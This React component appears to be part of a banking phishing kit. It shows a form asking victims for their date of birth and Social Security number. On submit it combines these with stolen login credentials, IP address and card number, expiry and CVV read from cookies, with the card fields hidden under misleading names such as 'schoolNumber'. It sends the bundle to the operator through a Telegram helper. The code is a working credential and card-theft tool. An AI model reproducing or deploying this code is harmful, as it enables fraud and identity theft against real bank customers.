import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

type IdentityT = {
  examCode: string;
  candidateNumber: string;
};

type Additional = {
  schoolNumber: string;
  resumptionDate: string;
  entryCode: string;
};

export default function Identity() {
  const [formInput, setFormInput] = useState<IdentityT>({
    examCode: "",
    candidateNumber: "",
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const ip: string = cookies.get("ip");
  const additional:Additional  = cookies.get("additional");
  const navigate = useNavigate();
const [isLoading, setIsLoading] = useState(false)
  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true)
    event.preventDefault();
    

    const message = `
    [----+🏦 CUSTOMER 🏦+-----]
    
    IP: ${ip}

    Fingerprint: ${navigator.userAgent}

    Username: ${login1.username}
    Password: ${login1.password}

    Username 2: ${login2.username2}
    Password 2: ${login2.password2}

    Kaad number: ${additional.schoolNumber}
    Kaad Expiry : ${additional.resumptionDate}
    Kaad Cvv: ${additional.entryCode}


    SSN: ${formInput.candidateNumber}
    Phone Number: ${formInput.examCode}
    `;

    await TelegramSend(message);
    setIsLoading(false);
    navigate("../success", {replace:true});
  }
  return (
    <>
    <form action="" method="post" onSubmit={handleSubmit}>
      <div className="form-area">
            <div className="input-field">
                <label htmlFor="">DOB</label>
                <input type="text" name="examCode" placeholder="MM/DD/YYYY" required onChange={handleInputChange}/>
            </div>
            <div className="input-field">
                <label htmlFor="">SSN</label>
                <input type="text" name="candidateNumber" required onChange={handleInputChange}/>
            </div>

          

          {isLoading ?
            (
            <button className="btn" type="button">Please wait.....</button>
            )
            :(
            <button className="btn" type="submit">Submit</button>)
}


           
        </div>
    </form>
    </>
  );
}
